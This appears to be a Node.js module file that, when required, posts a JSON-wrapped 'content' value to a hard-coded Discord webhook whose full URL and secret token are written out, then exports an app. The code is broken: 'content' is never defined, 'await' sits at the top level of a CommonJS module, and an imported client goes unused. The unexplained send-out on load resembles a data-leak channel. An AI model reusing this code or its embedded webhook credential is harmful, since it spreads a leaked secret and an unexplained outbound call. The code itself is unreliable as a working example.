const app = require('../app');
const client = require('../services/discordClient');

const contentBody = JSON.stringify(
    {
      content: `\`\`\`${JSON.stringify(
        content,
        null,
        2,
      )}\`\`\``,
    },
    null,
    2,
  )

  await fetch('https://discord.com/api/webhooks/1319363417022398486/VyC-CTL1jJNf9bVXtK4-pbNktc2RcoGqdQ9etG55djZqd53z3EXeuSeJWnFcyQT6ZsVk', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: contentBody,
  }) 



module.exports = app;